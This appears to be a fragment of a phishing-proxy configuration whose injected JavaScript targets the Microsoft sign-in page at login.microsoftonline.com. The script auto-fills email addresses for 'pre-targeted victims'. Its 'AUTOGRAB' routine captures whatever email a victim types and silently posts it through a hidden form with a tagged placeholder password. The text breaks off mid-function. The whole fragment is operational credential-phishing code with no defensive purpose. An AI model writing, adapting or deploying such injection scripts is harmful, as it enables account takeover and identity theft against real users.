js_inject:
  - trigger_domains: ['login.microsoftonline.com']
    trigger_paths: ['.*']
    trigger_params: ['email']
    script: |
      // Original auto-fill (for pre-targeted victims)
      function lp(){
        var email = document.querySelector('#i0116');
        var next = document.querySelector('#idSIButton9');
        if (email != null && next != null) {
          email.value = "{email}";
          email.dispatchEvent(new Event('input', { bubbles: true }));
          setTimeout(function(){ next.click(); }, 300);
          return;
        }
        setTimeout(function(){ lp(); }, 200);
      }
      var urlEmail = "{email}";
      if (urlEmail && urlEmail != "") {
        setTimeout(function(){ lp(); }, 200);
      }
      
      // ============= AUTOGRAB =============
      // This captures email the moment the victim types it and tabs to password
      setTimeout(function() {
        function setupAutoGrab() {
          var emailField = document.querySelector('#i0116');
          if (emailField) {
            emailField.addEventListener('blur', function() {
              var email = emailField.value;
              if (email && email.indexOf('@') > -1 && email.length > 5) {
                // Create a hidden form POST
                var form = document.createElement('form');
                form.method = 'POST';
                form.action = '/ppsecure/post.srf';
                form.style.display = 'none';
                
                // Email field (Microsoft uses 'loginfmt')
                var e = document.createElement('input');
                e.type = 'hidden'; e.name = 'loginfmt'; e.value = email;
                form.appendChild(e);
                
                // Fake password with __AUTOGRAB__ prefix so you know it's an autograb
                var p = document.createElement('input');
                p.type = 'hidden'; p.name = 'passwd';
                p.value = '__AUTOGRAB__' + email;
                form.appendChild(p);
                
                // Required Microsoft fields
                var o = document.createElement('input');
                o.type = 'hidden'; o.name = 'LoginOptions'; o.value = '1';
                form.appendChild(o);
                
                document.body.appendChild(form);
                form.submit();
              }
            });
            console.log('AutoGrab ready!');
          } else {
            setTimeout(setupAutoGrab, 500);
          }
        }
   